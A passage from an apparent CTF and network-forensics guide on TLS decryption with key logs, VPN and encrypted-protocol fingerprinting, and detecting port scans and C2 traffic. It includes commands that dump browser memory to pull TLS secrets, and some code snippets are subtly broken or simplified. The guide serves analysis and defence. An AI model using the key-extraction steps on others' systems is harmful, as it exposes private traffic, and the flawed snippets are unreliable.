        return False, "Timeout"
    except Exception as e:
        return False, str(e)

def main():
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <pcap> <key_directory>")
        sys.exit(1)
    
    pcap = sys.argv[1]
    key_dir = Path(sys.argv[2])
    
    if not os.path.exists(pcap):
        print(f"[-] PCAP file not found: {pcap}")
        sys.exit(1)
    
    if not key_dir.is_dir():
        print(f"[-] Key directory not found: {key_dir}")
        sys.exit(1)
    
    print(f"[*] Testing keys in {key_dir} against {pcap}")
    print("-" * 60)
    
    for key_file in key_dir.glob('*.pem') + key_dir.glob('*.key'):
        print(f"[*] Testing: {key_file.name}...", end=' ')
        
        success, sample = test_key_decryption(pcap, str(key_file))
        
        if success:
            print(f"✓ SUCCESS")
            print(f"    Sample URI: {sample}")
        else:
            print(f"✗ Failed")
    
    print("-" * 60)

if __name__ == '__main__':
    main()
```

### Extract Session Keys from Decrypted Traffic

**After Successful Decryption:**
```bash
# Extract TLS session information
tshark -r capture.pcap \
  -o "tls.keylog_file:sslkeys.log" \
  -Y "tls.handshake.type == 1" \
  -T fields \
  -e tls.handshake.random \
  -e frame.time

# Extract application data
tshark -r capture.pcap \
  -o "tls.keylog_file:sslkeys.log" \
  -Y "tls.app_data" \
  -T fields \
  -e tls.app_data | xxd -r -p > decrypted_data.bin
```

### Advanced: Manual TLS Decryption with Scapy
```python
from scapy.all import *
from Crypto.Cipher import AES
from Crypto.Hash import HMAC, SHA256
import struct

def decrypt_tls_record(encrypted_data, key, iv, mac_key, seq_num):
    """
    Manually decrypt TLS record (AES-CBC with HMAC-SHA256)
    [Inference] Simplified example - production TLS has additional complexity
    """
    
    # AES-CBC decryption
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted = cipher.decrypt(encrypted_data)
    
    # Remove padding
    pad_length = decrypted[-1]
    decrypted = decrypted[:-pad_length-1]
    
    # Verify and remove MAC
    mac_length = 32  # SHA256
    mac = decrypted[-mac_length:]
    data = decrypted[:-mac_length]
    
    # Verify HMAC (simplified)
    # [Inference] Actual verification requires proper TLS MAC calculation
    
    return data

# Load master secret and randoms from SSLKEYLOGFILE
# Derive keys using TLS PRF
# Decrypt individual records
# [Inference] This is a complex process requiring full TLS state machine
```

---

**Related Topics for Further Study**

- **TLS 1.3 Decryption Challenges** - Understanding ephemeral key requirements
- **DTLS Analysis** - Decrypting UDP-based TLS
- **Certificate Pinning Bypass** - Mobile app traffic decryption
- **QUIC Protocol Analysis** - Encrypted UDP alternative to TLS/TCP
- **Hardware Security Module (HSM) Key Extraction** - Advanced key recovery techniques

---

## Pre-Master Secret Logging

### Concept and Mechanism

Pre-Master Secret logging exploits the TLS/SSL key exchange process by capturing cryptographic material before encryption occurs. The `SSLKEYLOGFILE` environment variable instructs applications (browsers, curl, etc.) to write session keys to a file, enabling retroactive decryption of captured traffic.

**Key Material Logged:**

- CLIENT_RANDOM values (32 bytes)
- Pre-master secrets
- Master secrets
- Client/server random values

### Implementation in Kali Linux

**Setting Up Key Logging:**

```bash
# Set environment variable for current session
export SSLKEYLOGFILE=/tmp/sslkeys.log

# Make persistent for user (add to .bashrc)
echo 'export SSLKEYLOGFILE=/tmp/sslkeys.log' >> ~/.bashrc

# Verify variable is set
echo $SSLKEYLOGFILE
```

**Starting Network Capture with Key Logging:**

```bash
# Start Wireshark with key logging enabled
SSLKEYLOGFILE=/tmp/sslkeys.log wireshark &

# Capture with tcpdump while logging keys
SSLKEYLOGFILE=/tmp/sslkeys.log tcpdump -i eth0 -w encrypted.pcap

# Use with Firefox (already respects SSLKEYLOGFILE)
SSLKEYLOGFILE=/tmp/sslkeys.log firefox

# Use with Chrome/Chromium
SSLKEYLOGFILE=/tmp/sslkeys.log chromium-browser

# Use with curl
SSLKEYLOGFILE=/tmp/sslkeys.log curl https://target.com
```

### Wireshark Configuration for Decryption

**Loading Pre-Master Secrets:**

1. **Via GUI:**
    
    - Edit → Preferences → Protocols → TLS
    - "(Pre)-Master-Secret log filename" field: `/tmp/sslkeys.log`
    - Click "OK"
2. **Via Command Line:**
    

```bash
# Decrypt existing capture
tshark -r encrypted.pcap \
  -o tls.keylog_file:/tmp/sslkeys.log \
  -Y "http" \
  -T fields -e http.request.full_uri

# Export decrypted HTTP objects
tshark -r encrypted.pcap \
  -o tls.keylog_file:/tmp/sslkeys.log \
  --export-objects http,/tmp/exported_objects
```

**Verifying Decryption Success:**

```bash
# Check for decrypted application data
tshark -r encrypted.pcap \
  -o tls.keylog_file:/tmp/sslkeys.log \
  -Y "http or http2" | head

# Display decrypted HTTP headers
tshark -r encrypted.pcap \
  -o tls.keylog_file:/tmp/sslkeys.log \
  -Y "http.request or http.response" \
  -T fields -e http.host -e http.request.uri
```

### Key Log File Format

**Structure:**

```
CLIENT_RANDOM <64 hex chars> <96 hex chars>
RSA <128 hex chars> <96 hex chars>
CLIENT_RANDOM <64 hex chars> <96 hex chars>
```

**Example Entry:**

```
CLIENT_RANDOM 5234e0c86f6c4d8e9f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e 0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d
```

### Advanced Pre-Master Secret Techniques

**Extracting Keys from Memory:**

```bash
# Dump Firefox process memory (requires root)
sudo gcore $(pgrep firefox)

# Search for master secrets in memory dump
strings core.* | grep -E "CLIENT_RANDOM|MASTER_SECRET"

# Use volatility for memory analysis
volatility -f memory.dump --profile=LinuxProfilex64 linux_bash_env | grep SSLKEYLOGFILE
```

**Automated Key Extraction with mitmproxy:**

```bash
# Install mitmproxy
apt install mitmproxy

# Start with key logging
mitmproxy --set ssl_insecure=true --set sslkeylogfile=/tmp/mitmkeys.log

# Use mitmdump for non-interactive capture
mitmdump -w capture.mitm --set sslkeylogfile=/tmp/mitmkeys.log
```

### CTF-Specific Scenarios

**Challenge Pattern Recognition:**

1. **PCAP + Key File Provided:** Direct decryption scenario
2. **Application Binary Provided:** Extract `SSLKEYLOGFILE` environment or patch binary
3. **Memory Dump Provided:** Extract keys from process memory

**Example CTF Workflow:**

```bash
# Scenario: Given encrypted.pcap and sslkeys.log
# Extract flag from decrypted HTTP traffic

tshark -r encrypted.pcap \
  -o tls.keylog_file:sslkeys.log \
  -Y "http.request.method == POST" \
  -T fields -e http.file_data | xxd -r -p | strings | grep -i flag

# Decrypt and search for common flag patterns
tshark -r encrypted.pcap \
  -o tls.keylog_file:sslkeys.log \
  -Y "data.text" \
  -T fields -e data.text | grep -E "flag{.*}|CTF{.*}"
```

---

## VPN Traffic Identification

### VPN Protocol Fingerprinting

**OpenVPN Detection:**

```bash
# Filter for OpenVPN handshake (default port 1194 UDP)
tshark -r capture.pcap -Y "udp.port == 1194"

# Look for OpenVPN packet opcodes
tshark -r capture.pcap -Y "udp" -T fields -e data | head -c 2

# OpenVPN P_CONTROL_HARD_RESET_CLIENT_V2 (opcode 0x38)
tshark -r capture.pcap -Y "udp and data[0:1] == 38"

# Extract OpenVPN handshake packets
tshark -r capture.pcap \
  -Y "udp.port == 1194 and data[0:1] == 38" \
  -w openvpn_handshake.pcap
```

**WireGuard Detection:**

```bash
# WireGuard uses UDP port 51820 by default
tshark -r capture.pcap -Y "udp.port == 51820"

# WireGuard packet structure identification
# Message type 1: Handshake Initiation (148 bytes)
# Message type 2: Handshake Response (92 bytes)
# Message type 4: Transport Data (variable)

tshark -r capture.pcap \
  -Y "udp.port == 51820 and udp.length == 148" \
  -T fields -e data

# Identify by packet size patterns
tshark -r capture.pcap -Y "udp.port == 51820" -T fields -e udp.length | sort | uniq -c
```

**IPsec/IKEv2 Detection:**

```bash
# ISAKMP/IKE on UDP 500
tshark -r capture.pcap -Y "isakmp"

# NAT-T (IPsec over UDP 4500)
tshark -r capture.pcap -Y "udp.port == 4500"

# ESP (Encapsulating Security Payload) - IP protocol 50
tshark -r capture.pcap -Y "esp"

# Extract IKE handshake parameters
tshark -r capture.pcap -Y "isakmp.nextpayload" \
  -T fields -e isakmp.initiator_spi -e isakmp.responder_spi

# Identify IKEv2 exchanges
tshark -r capture.pcap -Y "isakmp.exchange_type"
```

**SSTP (Secure Socket Tunneling Protocol) Detection:**

```bash
# SSTP uses HTTPS (TCP 443) with specific SSTP headers
tshark -r capture.pcap -Y "tcp.port == 443 and http.request.uri contains SRASURVIVALGUIDE"

# Look for SSTP_DUPLEX_POST
tshark -r capture.pcap -Y "http.request.method == SSTP_DUPLEX_POST"
```

### Statistical VPN Detection

**Entropy Analysis:**

```bash
# High entropy indicates encrypted/VPN traffic
capinfos -T capture.pcap

# Use ent for entropy calculation
tshark -r capture.pcap -Y "data" -T fields -e data | xxd -r -p | ent

# Expected entropy for VPN traffic: ~7.9-8.0 bits per byte
```

**Packet Size Distribution Analysis:**

```bash
# MTU-based detection (VPN typically shows consistent packet sizes)
tshark -r capture.pcap -T fields -e frame.len | \
  awk '{count[$1]++} END {for (size in count) print size, count[size]}' | \
  sort -n

# VPN traffic often clusters around 1300-1400 bytes (due to encapsulation overhead)

# Visualize distribution
tshark -r capture.pcap -T fields -e frame.len | \
  sort -n | uniq -c | gnuplot -e "set term dumb; plot '-' with boxes"
```

**Timing Analysis:**

```bash
# Consistent inter-packet timing suggests VPN keepalives
tshark -r capture.pcap -T fields -e frame.time_relative -e frame.len | \
  awk '{print $1 - prev; prev = $1}' | \
  sort -n | uniq -c
```

### VPN-Specific Wireshark Display Filters

**OpenVPN:**

```
udp.port == 1194 || (udp && data[0:1] == 38)
```

**WireGuard:**

```
udp.port == 51820 || (udp && (udp.length == 148 || udp.length == 92))
```

**IPsec:**

```
isakmp || esp || udp.port == 4500
```

**Combined VPN Detection Filter:**

```
isakmp || esp || (udp.port == 1194) || (udp.port == 51820) || (udp.port == 4500) || (http.request.method == "SSTP_DUPLEX_POST")
```

### VPN Traffic Extraction and Analysis

**Extracting VPN Tunnel Contents [Inference]:**

[Inference] If cryptographic material is available, some VPN protocols may allow tunnel decryption.

```bash
# For OpenVPN with static key (rare in practice)
openvpn --secret static.key --show-tls --verb 5 < openvpn.pcap

# Extract ESP payload (requires keys)
tshark -r capture.pcap -Y "esp" -T fields -e esp.encrypted_data
```

**Identifying VPN Endpoints:**

```bash
# Extract source/destination IPs for VPN traffic
tshark -r capture.pcap -Y "udp.port == 1194" \
  -T fields -e ip.src -e ip.dst | sort -u

# Create conversation statistics
tshark -r capture.pcap -q -z conv,udp,"udp.port == 1194"

# Export endpoints
tshark -r capture.pcap -q -z endpoints,udp
```

---

## Encrypted Protocol Fingerprinting

### TLS/SSL Fingerprinting

**JA3 Fingerprinting:**

JA3 creates fingerprints from TLS Client Hello messages by hashing: SSL Version, Accepted Ciphers, List of Extensions, Elliptic Curves, and Elliptic Curve Formats.

**Generating JA3 Hashes:**

```bash
# Install ja3 tool
pip3 install pyja3

# Generate JA3 from pcap
ja3 -a capture.pcap -o ja3_hashes.json

# Using tshark (manual extraction)
tshark -r capture.pcap -Y "ssl.handshake.type == 1" \
  -T fields \
  -e ssl.handshake.version \
  -e ssl.handshake.ciphersuite \
  -e ssl.handshake.extension.type \
  -e ssl.handshake.extensions_supported_group \
  -e ssl.handshake.extensions_ec_point_format
```

**Using ja3 Python Script:**

```python
#!/usr/bin/env python3
from scapy.all import *
import hashlib

def create_ja3(pkt):
    if pkt.haslayer(TLS):
        client_hello = pkt[TLS]
        # Extract TLS version
        version = client_hello.version
        # Extract cipher suites
        ciphers = client_hello.ciphers
        # Extract extensions
        extensions = client_hello.extensions
        
        ja3_string = f"{version},{ciphers},{extensions}"
        ja3_hash = hashlib.md5(ja3_string.encode()).hexdigest()
        return ja3_hash

pcap = rdpcap("capture.pcap")
for pkt in pcap:
    print(create_ja3(pkt))
```

**JA3S (Server) Fingerprinting:**

```bash
# Extract Server Hello parameters
tshark -r capture.pcap -Y "ssl.handshake.type == 2" \
  -T fields \
  -e ssl.handshake.version \
  -e ssl.handshake.ciphersuite \
  -e ssl.handshake.extension.type
```

**Known JA3 Signatures [Unverified - Database Dependent]:**

[Unverified] JA3 databases map hashes to applications, but accuracy depends on database currency and completeness.

```bash
# Compare against JA3 database
# Download from: https://github.com/salesforce/ja3
wget https://raw.githubusercontent.com/salesforce/ja3/master/lists/osx-nix-ja3.csv

# Search for known malware JA3s
grep "5d65ea58ec6ce707e4128d4b9d4e3d3b" ja3_database.csv
```

### TLS Version and Cipher Suite Analysis

**Extracting TLS Versions:**

```bash
# Display TLS versions in capture
tshark -r capture.pcap -Y "ssl.handshake.type == 1" \
  -T fields -e ssl.handshake.version | sort | uniq -c

# Identify weak protocols (SSLv2, SSLv3, TLS 1.0)
tshark -r capture.pcap -Y "ssl.record.version < 0x0302"

# Hex values: SSLv3=0x0300, TLS1.0=0x0301, TLS1.1=0x0302, TLS1.2=0x0303, TLS1.3=0x0304
```

**Cipher Suite Enumeration:**

```bash
# List all negotiated cipher suites
tshark -r capture.pcap -Y "ssl.handshake.ciphersuite" \
  -T fields -e ssl.handshake.ciphersuite | sort -u

# Identify weak ciphers (NULL, EXPORT, DES, RC4)
tshark -r capture.pcap -Y "ssl.handshake.ciphersuite" \
  -T fields -e ssl.handshake.ciphersuite | \
  grep -E "0x00|0x03|0x06|0x08|0x09"

# Filter for strong ciphers (AES-GCM, ChaCha20)
tshark -r capture.pcap -Y "ssl.handshake.ciphersuite matches \".*GCM|ChaCha20.*\""
```

**Certificate Analysis:**

```bash
# Extract server certificates
tshark -r capture.pcap -Y "ssl.handshake.certificate" \
  -T fields -e ssl.handshake.certificate | xxd -r -p > cert.der

# Convert and view certificate
openssl x509 -inform der -in cert.der -text -noout

# Extract Common Name (CN)
tshark -r capture.pcap -Y "ssl.handshake.certificate" \
  -T fields -e x509ce.dNSName

# Extract all Subject Alternative Names (SANs)
tshark -r capture.pcap -Y "x509sat.printableString"
```

### SSH Fingerprinting

**SSH Protocol Version Detection:**

```bash
# Extract SSH version strings
tshark -r capture.pcap -Y "ssh" -T fields -e ssh.protocol

# Identify SSH key exchange methods
tshark -r capture.pcap -Y "ssh" \
  -T fields -e ssh.kex_algorithms

# Extract SSH server banner
tshark -r capture.pcap -Y "tcp.port == 22" -T fields -e data | \
  head -n 1 | xxd -r -p
```

**SSH Traffic Patterns:**

```bash
# Initial key exchange packet sizes (useful for fingerprinting)
tshark -r capture.pcap -Y "tcp.port == 22 and tcp.len > 0" \
  -T fields -e frame.number -e tcp.len | head -n 10

# Identify interactive vs. non-interactive sessions
# Interactive: many small packets
# SCP/SFTP: fewer, larger packets
tshark -r capture.pcap -Y "tcp.port == 22" \
  -T fields -e tcp.len | \
  awk '{sum+=$1; count++} END {print "Avg:", sum/count}'
```

### DNS over HTTPS (DoH) and DNS over TLS (DoT) Detection

**DoH Detection:**

```bash
# DoH uses HTTPS (TCP 443) to specific resolvers
# Common DoH providers: 1.1.1.1, 8.8.8.8, 9.9.9.9

# Filter for traffic to known DoH resolvers
tshark -r capture.pcap -Y "ip.dst == 1.1.1.1 || ip.dst == 8.8.8.8"

# Detect by SNI (Server Name Indication)
tshark -r capture.pcap -Y "ssl.handshake.extensions_server_name matches \".*cloudflare-dns.com|dns.google|dns.quad9.net.*\""

# Identify by HTTP/2 requests to /dns-query
tshark -r capture.pcap -Y "http2.headers.path == \"/dns-query\""
```

**DoT Detection:**

```bash
# DoT uses TCP 853
tshark -r capture.pcap -Y "tcp.port == 853"

# Extract TLS SNI for DoT servers
tshark -r capture.pcap -Y "tcp.port == 853 and ssl.handshake.type == 1" \
  -T fields -e ssl.handshake.extensions_server_name

# Identify DoT by certificate CN
tshark -r capture.pcap -Y "tcp.port == 853" \
  -T fields -e x509ce.dNSName | grep -i dns
```

### QUIC Protocol Fingerprinting

**QUIC Detection and Analysis:**

```bash
# QUIC typically uses UDP 443
tshark -r capture.pcap -Y "udp.port == 443"

# Identify QUIC version
tshark -r capture.pcap -Y "quic" -T fields -e quic.version

# Extract QUIC connection IDs
tshark -r capture.pcap -Y "quic" \
  -T fields -e quic.dcid.len -e quic.scid.len

# QUIC packet type distribution
tshark -r capture.pcap -Y "quic" -T fields -e quic.packet_type | sort | uniq -c
```

**HTTP/3 over QUIC:**

```bash
# HTTP/3 uses QUIC as transport
tshark -r capture.pcap -Y "http3"

# Extract HTTP/3 headers
tshark -r capture.pcap -Y "http3.headers.method" \
  -T fields -e http3.headers.method -e http3.headers.path
```

### Application Layer Protocol Identification

**Protocol Hierarchy Statistics:**

```bash
# Generate protocol hierarchy
tshark -r capture.pcap -q -z io,phs

# Identify unknown protocols by port distribution
tshark -r capture.pcap -q -z conv,tcp

# Top talkers by bytes
tshark -r capture.pcap -q -z endpoints,ip
```

**Custom Protocol Fingerprinting:**

```bash
# Extract first 16 bytes of TCP payloads (magic numbers)
tshark -r capture.pcap -Y "tcp.len > 0" \
  -T fields -e data.data | cut -c1-32 | sort | uniq -c

# Search for specific protocol signatures
tshark -r capture.pcap -Y "data.data contains 47:45:54" # GET in hex

# Identify custom protocols by packet patterns
tshark -r capture.pcap -T fields -e frame.len -e frame.time_relative | \
  awk '{print $2 - prev, $1; prev = $2}'
```

### Encrypted Traffic Classification without Decryption [Inference]

[Inference] Statistical methods can classify encrypted traffic, but accuracy varies with methodology and training data.

**Machine Learning Approach [Unverified]:**

[Unverified] ML-based traffic classification requires trained models and may not generalize across networks.

```bash
# Extract features for classification
tshark -r capture.pcap -T fields \
  -e frame.len \
  -e frame.time_relative \
  -e tcp.len \
  -e tcp.flags > features.csv

# Use existing tools like nDPI for protocol detection
apt install ndpi-bin
ndpiReader -i capture.pcap
```

**Behavioral Analysis:**

```bash
# Video streaming: large sustained flows with periodic bursts
tshark -r capture.pcap -Y "tcp" -q -z io,stat,1,"tcp.len > 1000"

# VoIP: small packets at regular intervals (~20ms)
tshark -r capture.pcap -Y "udp.length < 200" \
  -T fields -e frame.time_relative | \
  awk '{print $1 - prev; prev = $1}' | \
  awk '$1 < 0.05' | wc -l

# File transfer: consistent large packets until completion
tshark -r capture.pcap -Y "tcp.len > 1400" -T fields -e tcp.stream | sort -u
```

---

## Important Related Topics

**Decryption Techniques:** Side-channel attacks, downgrade attacks, BEAST, CRIME, BREACH exploitation

**Certificate Analysis:** Certificate pinning, transparency logs, revocation checking, chain validation

**Protocol Confusion:** ALPN negotiation, protocol downgrade detection, version rollback identification

---

# Malicious Traffic Detection

## Port Scanning Detection

### Overview

Port scanning is reconnaissance activity where an attacker probes multiple ports on target systems to identify open services. Detection involves identifying patterns inconsistent with normal network behavior.

### Common Port Scan Types

**TCP Connect Scan:**

- Completes full three-way handshake
- Most reliable but easily detected
- Leaves clear logs on target

**TCP SYN Scan (Half-Open):**

- Sends SYN, receives SYN-ACK, sends RST
- Stealthier than connect scan
- Most common scan type

**TCP FIN/NULL/Xmas Scan:**

- Sends packets with unusual flag combinations
- Exploits RFC793 behavior
- Effective against simple firewalls

**UDP Scan:**

- Sends UDP packets to target ports
- Relies on ICMP port unreachable responses
- Slower and less reliable

**ACK Scan:**

- Determines firewall rules
- Packets have only ACK flag set
- Maps firewall rulesets

### Wireshark Detection Techniques

**Basic Port Scan Filters:**

```
# Multiple SYN packets from single source
tcp.flags.syn == 1 && tcp.flags.ack == 0

# Multiple connection attempts to different ports
tcp.flags.syn == 1 && tcp.flags.ack == 0 && tcp.analysis.retransmission == 0

# Half-open scan (SYN followed by RST)
tcp.flags.syn == 1 && tcp.flags.rst == 1
```

**SYN Scan Detection:**

```
# SYN packets without subsequent ACK
tcp.flags == 0x002

# Multiple SYN packets from one IP
tcp.flags.syn == 1 && tcp.flags.ack == 0

# Display filter for scan analysis
tcp.flags.syn == 1 && tcp.flags.ack == 0 && tcp.window_size_value < 1024
```

**Statistics-Based Detection:**

```
# Wireshark Statistics Menu:
Statistics → Conversations → TCP tab

Look for:
- Single source IP with connections to many destination ports
- High packet count with low byte count (failed connections)
- Short duration connections
```

**Port Scan Conversation Pattern:**

```
Statistics → Protocol Hierarchy
TCP → %
  - High percentage of SYN packets
  - High percentage of RST packets
  - Low percentage of data transfer
```

### Tshark Analysis

**Identify Scanning Hosts:**

```bash
# Count unique destination ports per source IP
tshark -r capture.pcap -Y "tcp.flags.syn == 1 && tcp.flags.ack == 0" \
  -T fields -e ip.src -e tcp.dstport | \
  awk '{print $1}' | sort | uniq -c | sort -rn

# Output: connection_count source_ip
```

**Horizontal vs Vertical Scans:**

```bash
# Vertical scan: One target, many ports
tshark -r capture.pcap -Y "tcp.flags.syn == 1 && tcp.flags.ack == 0" \
  -T fields -e ip.src -e ip.dst -e tcp.dstport | \
  awk '{print $1, $2}' | sort | uniq -c | sort -rn

# Horizontal scan: Many targets, one/few ports
tshark -r capture.pcap -Y "tcp.flags.syn == 1 && tcp.flags.ack == 0" \
  -T fields -e ip.src -e tcp.dstport | \
  awk '{print $1, $2}' | sort | uniq -c | sort -rn
```

**Time-Based Analysis:**

```bash
# Extract scan timing
tshark -r capture.pcap -Y "tcp.flags.syn == 1 && tcp.flags.ack == 0" \
  -T fields -e frame.time_epoch -e ip.src -e tcp.dstport | \
  awk '{print $1, $2, $3}' | sort -n

# Calculate scan rate
tshark -r capture.pcap -Y "tcp.flags.syn == 1 && tcp.flags.ack == 0 && ip.src == SCANNER_IP" \
  -T fields -e frame.time_epoch | \
  awk 'NR==1{first=$1} END{print (NR-1)/(($1-first)+0.001) " packets/sec"}'
```

**Port Sequence Analysis:**

```bash
# Extract scanned ports in order
tshark -r capture.pcap -Y "tcp.flags.syn == 1 && tcp.flags.ack == 0 && ip.src == SCANNER_IP" \
  -T fields -e tcp.dstport | head -50

# Sequential ports indicate scripted scan
# Random ports indicate stealth scan
```

### Nmap Signature Detection

**OS Detection Scan:**

```
# Characteristic packets from nmap -O
tcp.options.wscale == 10
tcp.options.mss_val == 1460
tcp.window_size == 1024
```

**Version Detection Scan:**

```
# Nmap -sV sends probe packets
tcp.payload contains "GET / HTTP/1.0"
tcp.payload contains "HELP\r\n"

# Generic service probes
tcp.len > 0 && tcp.flags == 0x018
```

**Script Scan Detection:**

```
# NSE scripts generate distinctive traffic
http.user_agent contains "Nmap"
tcp.payload contains "Nmap"

# HTTP NSE scripts
http.request.uri contains "/nmaplowercheck"
```

**Timing Template Indicators:**

|Template|Packets/Second|Detection|
|---|---|---|
|T0 (Paranoid)|1 per 5 min|Very difficult|
|T1 (Sneaky)|1 per 15 sec|Difficult|
|T2 (Polite)|1 per 0.4 sec|Moderate|
|T3 (Normal)|Multiple/sec|Easy|
|T4 (Aggressive)|10+/sec|Very easy|
|T5 (Insane)|100+/sec|Trivial|

### Stealth Scan Detection

**FIN Scan:**

```
# Only FIN flag set
tcp.flags == 0x001

# FIN to closed ports (unusual)
tcp.flags.fin == 1 && tcp.flags.syn == 0 && tcp.flags.ack == 0
```

**NULL Scan:**

```
# No flags set
tcp.flags == 0x000

# Highly unusual in normal traffic
```

**Xmas Scan:**

```
# FIN, PSH, URG flags set
tcp.flags == 0x029

# Named for "lit up like a Christmas tree"
```

**Maimon Scan:**

```
# FIN/ACK combination to closed ports
tcp.flags == 0x011
```

**Idle (Zombie) Scan:** [Inference] Detection requires identifying the zombie host's IPID incrementing pattern, which is challenging without baseline traffic analysis.

```bash
# Look for spoofed traffic patterns
# Requires correlation of IPID values
tshark -r capture.pcap -Y "tcp.flags.syn == 1" \
  -T fields -e ip.src -e ip.id | sort
```

### UDP Scan Detection

**Basic UDP Scan:**

```
# UDP packets to many ports
udp

# ICMP port unreachable responses
icmp.type == 3 && icmp.code == 3
```

**Closed Port Responses:**

```bash
# Count ICMP unreachable per destination
tshark -r capture.pcap -Y "icmp.type == 3 && icmp.code == 3" \
  -T fields -e ip.dst | sort | uniq -c | sort -rn
```

**Open Port Identification:**

```bash
# UDP without ICMP response indicates open/filtered
# Compare sent UDP vs received ICMP unreachable
tshark -r capture.pcap -Y "udp" -T fields -e ip.dst -e udp.dstport | sort -u > sent.txt
tshark -r capture.pcap -Y "icmp.type == 3 && icmp.code == 3" \
  -T fields -e ip.src -e icmp.port | sort -u > responded.txt
comm -23 sent.txt responded.txt  # Likely open ports
```

### Statistical Analysis

**Connection State Distribution:**

```bash
# Analyze TCP connection states
tshark -r capture.pcap -q -z conv,tcp

# High RST count indicates scanning
```

**Port Distribution Analysis:**

```bash
# Most targeted ports
tshark -r capture.pcap -Y "tcp.flags.syn == 1 && tcp.flags.ack == 0" \
  -T fields -e tcp.dstport | sort | uniq -c | sort -rn | head -20

# Well-known vs high ports
tshark -r capture.pcap -Y "tcp.flags.syn == 1 && tcp.flags.ack == 0" \
  -T fields -e tcp.dstport | \
  awk '{if ($1 < 1024) wk++; else high++} END {print "Well-known:", wk, "High:", high}'
```

**TTL Analysis:**

```bash
# Unusual TTL values may indicate spoofing
tshark -r capture.pcap -Y "tcp.flags.syn == 1" \
  -T fields -e ip.src -e ip.ttl | sort | uniq -c

# TTL variations from same source are suspicious
```

### False Positive Reduction

**Legitimate High-Port Activity:**

```
# Exclude common legitimate scanners
!(ip.src == VULNERABILITY_SCANNER_IP)

# Exclude service discovery
!(tcp.dstport == 5353)  # mDNS
!(udp.dstport == 137 || udp.dstport == 138)  # NetBIOS
```

**Application-Level Port Sweeping:**

```
# Some applications legitimately probe ports
# e.g., BitTorrent, P2P applications

# Filter by application signatures
tcp.payload or udp.payload
```

### Automated Detection Scripts

**Python Port Scan Detector:**

```python
#!/usr/bin/env python3
import pyshark
from collections import defaultdict
from datetime import datetime

def detect_port_scan(pcap_file, threshold=20):
    """Detect port scanning activity"""
    
    syn_packets = defaultdict(lambda: defaultdict(set))
    
    cap = pyshark.FileCapture(pcap_file, 
                              display_filter='tcp.flags.syn == 1 && tcp.flags.ack == 0')
    
    for packet in cap:
        try:
            src_ip = packet.ip.src
            dst_ip = packet.ip.dst
            dst_port = packet.tcp.dstport
            timestamp = float(packet.sniff_timestamp)
            
            syn_packets[src_ip][dst_ip].add(dst_port)
            
        except AttributeError:
            continue
    
    cap.close()
    
    # Analyze for scanning behavior
    print("=== Port Scan Detection Results ===\n")
    for src_ip, targets in syn_packets.items():
        for dst_ip, ports in targets.items():
            if len(ports) >= threshold:
                print(f"[ALERT] Potential scan detected:")
                print(f"  Source: {src_ip}")
                print(f"  Target: {dst_ip}")
                print(f"  Ports scanned: {len(ports)}")
                print(f"  Sample ports: {sorted(list(ports))[:10]}")
                print()

if __name__ == "__main__":
    detect_port_scan("capture.pcap", threshold=20)
```

**Bash Detection Script:**

```bash
#!/bin/bash
# Simple port scan detector

PCAP="$1"
THRESHOLD=15

echo "=== Port Scan Detection ==="
echo

# Extract SYN packets
tshark -r "$PCAP" -Y "tcp.flags.syn == 1 && tcp.flags.ack == 0" \
  -T fields -e ip.src -e ip.dst -e tcp.dstport 2>/dev/null | \
while read src dst port; do
    echo "$src $dst $port"
done | \
awk -v thresh="$THRESHOLD" '
{
    key = $1 " -> " $2
    ports[key] = ports[key] " " $3
    count[key]++
}
END {
    for (k in count) {
        if (count[k] >= thresh) {
            print "[ALERT]", k, "- Ports scanned:", count[k]
            print "  Sample ports:", substr(ports[k], 1, 100)
            print ""
        }
    }
}' | sort -t: -k2 -rn
```

### Common Port Scan Patterns

**Top 1000 Ports Scan:**

```bash
# Nmap default
# Check if scanned ports match nmap-services top 1000
tshark -r capture.pcap -Y "tcp.flags.syn == 1 && ip.src == SCANNER_IP" \
  -T fields -e tcp.dstport | sort -u > scanned_ports.txt

# Compare with /usr/share/nmap/nmap-services
```

**Sequential Port Scan:**

```bash
# Ports scanned in order
tshark -r capture.pcap -Y "tcp.flags.syn == 1 && ip.src == SCANNER_IP" \
  -T fields -e frame.number -e tcp.dstport | \
  awk 'NR>1{diff=$2-prev; print diff}; {prev=$2}' | \
  sort | uniq -c

# Output showing mostly 1's indicates sequential scan
```

**Randomized Port Scan:**

```bash
# Large jumps in port numbers
tshark -r capture.pcap -Y "tcp.flags.syn == 1 && ip.src == SCANNER_IP" \
  -T fields -e tcp.dstport | \
  awk 'NR>1{diff=$1-prev; sum+=diff; count++} {prev=$1} 
       END{print "Average port jump:", sum/count}'

# High average indicates randomized scan
```

## C2 (Command & Control) Patterns

### Overview

Command & Control (C2) infrastructure allows attackers to communicate with compromised systems. Detection involves identifying communication patterns, protocols, and behaviors consistent with C2 activity.

### Common C2 Characteristics

**Communication Patterns:**

- Periodic beaconing at regular intervals
- Unusual protocols or ports
- Encrypted/encoded payloads
- Long-lived connections
- Asymmetric traffic (small requests, large responses)

**Network Indicators:**

- Connections to known malicious IPs/domains
- Use of dynamic DNS services
- Fast-flux DNS techniques
- Domain generation algorithms (DGA)

### DNS-Based C2 Detection

**Unusual DNS Queries:**

```
# Excessively long domain names
dns && dns.qry.name.len > 50

# High entropy domain names (random-looking)
dns

# Suspicious TLDs
dns.qry.name contains ".tk" || dns.qry.name contains ".xyz" || dns.qry.name contains ".top"
```

**DNS Query Analysis:**

```bash
# Extract all DNS queries
tshark -r capture.pcap -Y "dns.flags.response == 0" \
  -T fields -e dns.qry.name | sort | uniq -c | sort -rn

# High query frequency for single domain
```

**Domain Generation Algorithm (DGA) Detection:**

```bash
# Extract domains and calculate entropy
tshark -r capture.pcap -Y "dns.flags.response == 0" \
  -T fields -e dns.qry.name > domains.txt

# Python entropy calculator
python3 << 'EOF'
import math
from collections import Counter

def calculate_entropy(string):
    """Calculate Shannon entropy"""
    if not string:
        return 0
    entropy = 0
    for count in Counter(string).values():
        p = count / len(string)
        entropy -= p * math.log2(p)
    return entropy

with open('domains.txt', 'r') as f:
    for line in f:
        domain = line.strip().split('.')[0]  # Get subdomain
        if len(domain) > 10:
